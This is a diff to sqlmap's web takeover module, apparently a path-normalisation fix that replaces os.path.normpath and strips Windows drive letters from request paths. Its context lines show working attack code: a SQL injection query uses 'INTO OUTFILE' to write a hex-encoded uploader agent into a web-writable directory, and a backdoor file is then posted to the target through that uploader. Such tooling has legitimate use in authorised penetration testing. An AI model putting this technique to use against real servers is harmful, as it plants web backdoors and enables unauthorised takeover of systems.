@@ -31,6 +31,7 @@ from lib.core.common import decloakToNamedTemporaryFile
 from lib.core.common import fileToStr
 from lib.core.common import getDirs
 from lib.core.common import getDocRoot
+from lib.core.common import normalizePath
 from lib.core.common import readInput
 from lib.core.convert import hexencode
 from lib.core.data import conf
@@ -96,7 +97,7 @@ class Web:
 
         elif self.webApi == "asp":
             backdoorRemotePath = "%s/%s" % (directory, destFileName)
-            backdoorRemotePath = os.path.normpath(backdoorRemotePath)
+            backdoorRemotePath = normalizePath(backdoorRemotePath)
             backdoorContent = stream.read()
             postStr = "f=%s&d=%s" % (backdoorRemotePath, backdoorContent)
             page, _ = Request.getPage(url=self.webUploaderUrl, direct=True, post=postStr)
@@ -164,7 +165,8 @@ class Web:
         
         for directory in directories:
             # Upload the uploader agent
-            outFile     = os.path.normpath("%s/%s" % (directory, uploaderName))
+            
+            outFile     = normalizePath("%s/%s" % (directory, uploaderName))
             uplQuery    = uploaderContent.replace("WRITABLE_DIR", directory)
             query       = " LIMIT 1 INTO OUTFILE '%s' " % outFile
             query      += "LINES TERMINATED BY 0x%s --" % hexencode(uplQuery)
@@ -172,8 +174,10 @@ class Web:
             query       = agent.postfixQuery(query)
             payload     = agent.payload(newValue=query)
             page        = Request.queryPage(payload)
-
-            requestDir  = os.path.normpath(directory.replace(kb.docRoot, "/").replace("\\", "/"))
+            
+            requestDir  = normalizePath(directory.replace(kb.docRoot, "/").replace("\\", "/"))
+            if re.search("\A[A-Za-z]:", requestDir):
+                requestDir = requestDir[2:]
             self.webBaseUrl     = "%s://%s:%d%s" % (conf.scheme, conf.hostname, conf.port, requestDir)
             self.webUploaderUrl = "%s/%s" % (self.webBaseUrl, uploaderName)
             self.webUploaderUrl = self.webUploaderUrl.replace("./", "/").replace("\\", "/")
